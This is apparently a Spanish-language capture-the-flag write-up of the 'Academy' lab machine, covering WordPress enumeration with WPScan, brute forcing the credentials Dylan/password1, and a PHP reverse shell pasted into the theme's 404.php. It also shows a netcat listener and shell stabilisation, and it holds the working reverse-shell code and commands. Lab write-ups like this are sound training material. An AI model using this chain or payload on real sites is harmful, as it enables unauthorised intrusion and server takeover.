# Informe de Explotación - Máquina "Academy" (The Hacker Labs)
**IP Objetivo:** IP_DE_LA_MAQUINA
**Fecha:** 23 Julio 2026
**Autor:** Kali (opencode)

---

## 1. RESUMEN EJECUTIVO

Se ha obtenido acceso inicial a la máquina "Academy" comprometiendo un sitio WordPress 6.5.3 mediante fuzzing recursivo, enumeración con WPScan, fuerza bruta de credenciales y explotación del editor de temas para obtener una reverse shell como `www-data`.

**Vectores de ataque utilizados:**
1. `dirsearch -r` → Descubrimiento de `/wordpress` → Configuración `/etc/hosts`
2. WPScan → Enumeración de usuarios y plugins (Elementor)
3. WPScan brute force → Credenciales `Dylan` / `password1`
4. Login `/wp-admin` → Editor de temas → Reverse shell PHP en `404.php`
5. Estabilización de shell → Acceso como `www-data`

**Nota:** La escalada de privilegios a root quedó pendiente para un módulo posterior.

**Cadena de compromiso:** WordPress → Dylan → www-data

---

## 2. RECONOCIMIENTO INICIAL

### 2.1 Descubrimiento de host
```bash
sudo netdiscover -r 10.0.2.0/24
```

**Resultado:** Se localizó la máquina objetivo en la red local.

### 2.2 Escaneo de puertos (Nmap)
```bash
sudo nmap -sV -p- IP_DE_LA_MAQUINA
```

**Resultado:**
| Puerto | Estado | Servicio | Versión |
|--------|--------|----------|---------|
| 22/tcp | Open | SSH | OpenSSH |
| 80/tcp | HTTP | Apache | Apache httpd |

**Por qué:** Identificar superficie de ataque. Web en puerto 80 es vector principal.

---

## 3. ENUMERACIÓN WEB

### 3.1 Fuzzing recursivo de directorios (dirsearch)
```bash
dirsearch -u http://IP_DE_LA_MAQUINA/ -r -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

**Resultado:**
- `/wordpress` (código 301, redirección)
- `wp-login.php`
- `wp-content/uploads`
**Por qué:** El flag `-r` activa la enumeración recursiva. Sin recursividad no se habrían descubierto las rutas internas.

### 3.2 Configuración de /etc/hosts
```bash
sudo nano /etc/hosts
```

Añadir la línea:
```
IP_DE_LA_MAQUINA academy.thehackerlabs
```

**Por qué:** WordPress usa el dominio `academy.thehackerlabs`. Sin esta configuración, el navegador y WPScan no resuelven el dominio. La redirección 301 causa que las herramientas fallen.

---

## 4. ENUMERACIÓN CMS (WPScan)

### 4.1 Detección del CMS
```bash
wpscan --url http://academy.thehackerlabs/wordpress
```

**Resultado:**
- WordPress **versión 6.5.3**
- Presencia de `xmlrpc.php`
- Presencia de `readme.html`
- Directorio `wp-content/uploads` accesible

### 4.2 Enumeración de usuarios
```bash
wpscan --url http://academy.thehackerlabs/wordpress -e u
```

**Resultado:** Se enumeraron los usuarios válidos del WordPress.

### 4.3 Enumeración de plugins
```bash
wpscan --url http://academy.thehackerlabs/wordpress --enumerate ap
```

**Resultado:** Se detectó el plugin **Elementor**.

### 4.4 Plugins vulnerables con API Token
```bash
wpscan --url http://academy.thehackerlabs/wordpress --enumerate vp --api-token {API_TOKEN}
```

**Resultado:** Se listaron vulnerabilidades con sus CVEs.

---

## 5. CRACKING DE CREDENCIALES

### 5.1 Fuerza bruta WordPress (WPScan)
```bash
wpscan --url http://academy.thehackerlabs/wordpress --enumerate ap --passwords /usr/share/wordlists/rockyou.txt
```

**Resultado:**
```
Usuario: Dylan
Contraseña: password1
```

**Por qué:** La fuerza bruta es el último recurso. En WordPress se prefiere WPScan frente a Hydra o Burp Intruder. `password1` es una contraseña típica de rockyou.txt.

---

## 6. ACCESO INICIAL

### 6.1 Login al panel de WordPress
```bash
# Acceder a http://academy.thehackerlabs/wp-admin
# Iniciar sesión con: Dylan / password1
```

**Resultado:** Se accedió al panel de administración de WordPress.

### 6.2 RCE: Reverse Shell por editor de temas

**Pasos:**
1. Ir a **Apariencia → Editor de temas**
2. Seleccionar la plantilla **`404.php`**
3. Pegar una **reverse shell PHP**:

```php
<?php
$sock = fsockopen("IP_KALI", 1234);
$proc = proc_open("/bin/bash -i", array(0=>$sock, 1=>$sock, 2=>$sock), $pipes);
?>
```

4. Guardar cambios

### 6.3 Reverse Shell: De HTTP a TCP

**En Kali (listener):**
```bash
nc -lvnp 1234
```

**Disparar la shell:**
Visitar `http://academy.thehackerlabs/wordpress/404.php` en el navegador.

**Resultado:**
```
connect to [IP_KALI] from (UNKNOWN) [IP_MAQUINA] xxxx
bash: no hay control de trabajos en este shell
www-data@academy:~$
```

**Por qué:** El tráfico cambia de HTTP a TCP. Una vez dentro, el WAF (Wordfence) ya no protege. Actúa a nivel de aplicación; dentro solo queda el firewall del sistema.

### 6.4 Estabilización de la shell
```bash
# En la shell reverse
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm

# Ctrl+Z para suspender
# En Kali:
stty raw -echo; fg

# Presionar Enter
whoami
id
```

**Resultado:**
```
www-data
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

---

## 7. ENUMERACIÓN POST-EXPLOTACIÓN

### 7.1 Verificación de usuario
```bash
whoami
# www-data
id
# uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

**Nota:** La escalada de privilegios a root quedó pendiente para el módulo de escalada. No se obtuvo la flag de root en esta sesión.

---

## 8. CADENA DE ATAQUE COMPLETA

```
┌──────────────────────────────────────────────────────────────┐
│                   CADENA DE EXPLOTACIÓN                       │
├──────────────────────────────────────────────────────────────┤
│                                                              │
│  [1] RECONOCIMIENTO                                          │
│  ┌─ Nmap ──────────────────────┐                              │
│  │ Puertos: 22(SSH), 80(HTTP)  │                              │
│  └─────────────────────────────┘                              │
│        │                                                     │
│        ▼                                                     │
│  [2] ENUMERACIÓN WEB                                         │
│  ┌─ dirsearch -r ──────────────┐  ┌─ /wordpress (301) ──┐   │
│  │ Fuzzing recursivo            │──│ Redirección dominio  │   │
│  └──────────────────────────────┘  └────────────────────┘   │
│        │                                                     │
│        ▼                                                     │
│  [3] CONFIGURACIÓN DOMINIO                                   │
│  ┌─ /etc/hosts ─────────────────┐  ┌─ academy.thehackerlabs ┐│
│  │ IP → dominio                  │──│ Resolución DNS local   ││
│  └───────────────────────────────┘  └────────────────────────┘│
│        │                                                     │
│        ▼                                                     │
│  [4] ENUMERACIÓN CMS                                         │
│  ┌─ WPScan ─────────────────────┐  ┌─ WordPress 6.5.3 ────┐ │
│  │ Versión + plugins             │──│ Elementor detectado   │ │
│  └───────────────────────────────┘  └──────────────────────┘ │
│        │                                                     │
│        ▼                                                     │
│  [5] CRACKING DE CREDENCIALES                                │
│  ┌─ WPScan brute force ─────────┐  ┌─ Dylan / password1 ──┐ │
│  │ rockyou.txt                   │──│ Credenciales halladas │ │
│  └───────────────────────────────┘  └──────────────────────┘ │
│        │                                                     │
│        ▼                                                     │
│  [6] ACCESO AL PANEL                                         │
│  ┌─ /wp-admin ──────────────────┐  ┌─ Editor de temas ────┐ │
│  │ Login con Dylan               │──│ 404.php → rev shell  │ │
│  └───────────────────────────────┘  └──────────────────────┘ │
│        │                                                     │
│        ▼                                                     │
│  [7] REVERSE SHELL                                           │
│  ┌─ nc -lvnp 1234 ─────────────┐  ┌─ www-data shell ─────┐ │
│  │ TCP connection                │──│ HTTP→TCP bypass WAF  │ │
│  └───────────────────────────────┘  └──────────────────────┘ │
│        │                                                     │
│        ▼                                                     │
│  [8] ESTABILIZACIÓN                                          │
│  ┌─ python3 pty ────────────────┐  ┌─ Shell estable ──────┐ │
│  │ TTY spawn                     │──│ Acceso inicial logrado│ │
│  └───────────────────────────────┘  └──────────────────────┘ │
│        │                                                     │
│        ▼                                                     │
│  [9] ESTADO FINAL                                            │
│  ┌──────────────────────────────────────────────────────────┐│
│  │ USER (www-data): Acceso logrado                           ││
│  │ ROOT: PENDIENTE (módulo de escalada)                      ││
│  └──────────────────────────────────────────────────────────┘│
│                                                              │
└──────────────────────────────────────────────────────────────┘
```

---

## 12. EVIDENCIAS DE COMPROMISO

```
┌──────────────────────────────────────────────────────────────┐
│                       FLAGS OBTENIDAS                         │
├──────────────────────────────────────────────────────────────┤
│ USER (www-data): Acceso logrado                               │
│ ROOT: PENDIENTE (módulo de escalada)                          │
└──────────────────────────────────────────────────────────────┘

┌──────────────────────────────────────────────────────────────┐
│                     ACCESOS LOGRADOS                          │
├──────────────────────────────────────────────────────────────┤
│ ✓ WPScan → Enumeración de usuarios y plugins                 │
│ ✓ Brute force → Dylan / password1                            │
│ ✓ Login wp-admin → Panel de administración                   │
│ ✓ Editor de temas → Reverse shell PHP en 404.php             │
│ ✓ Shell www-data estabilizada con python3 pty                 │
└──────────────────────────────────────────────────────────────┘

┌──────────────────────────────────────────────────────────────┐
│                          NOTA                                 │
├──────────────────────────────────────────────────────────────┤
│ La escalada de privilegios a root NO fue completada           │
│ en esta sesión. Queda pendiente para un módulo posterior.     │
└──────────────────────────────────────────────────────────────┘
```

---

**FIN DEL INFORME**



---

## 🔗 Red de Conocimiento

### Documentos Relacionados

- [[../write-ups/Academy-THL.md|Academy-THL]] — Metasploit, Nmap, WordPress
- [[../apuntes Chema/Maquinas/Auditoría de CMS — WordPress (máquina Academy).md|Auditoría de CMS — WordPress (máquina Academy)]] — Metasploit, Nmap, WordPress
- [[../apuntes Chema/Auditoria web.md|Auditoria web]] — Linux, Metasploit, Nmap
- [[../Apuntes/05 - Auditoria Web/Auditoria Web — Práctica con Metasploitable.md|Auditoria Web — Práctica con Metasploitable]] — Linux, Metasploit, Nmap
- [[../Apuntes/06 - Explotacion y Post-Explotacion/Son ROBOTS — RickdiculouslyEasy y Mr. Robot.md|Son ROBOTS — RickdiculouslyEasy y Mr. Robot]] — Linux, Metasploit, Nmap
- [[../apuntes Chema/Maquinas/Son ROBOTS.md|Son ROBOTS]] — Linux, Metasploit, Nmap

### 🛠️ Herramientas

- [[comandos/BurpSuite|Burp Suite]]
- [[comandos/DirSearch|DirSearch]]
- [[comandos/Feroxbuster|Feroxbuster]]
- [[comandos/Hydra|Hydra]]
- [[comandos/Metasploit|Metasploit]]
- [[comandos/Metasploit|Netcat / Reverse Shells]]
- [[comandos/Nmap|Nmap]]
- [[comandos/SSH|SSH]]
- [[comandos/WPScan|WPScan]]

### 🎯 Vulnerabilidades Relacionadas

- [[Apuntes/06 - Explotacion y Post-Explotacion/Reverse Shells y Post-Explotación.md|Command Injection / RCE]]

> #burpsuite #command-injection #dirsearch #escalada-privilegios #feroxbuster #file-upload #hydra #kali #linux #metasploit #metasploitable #netcat #nmap #post-explotacion #redes #reverse-shell #ssh #wordpress #wpscan
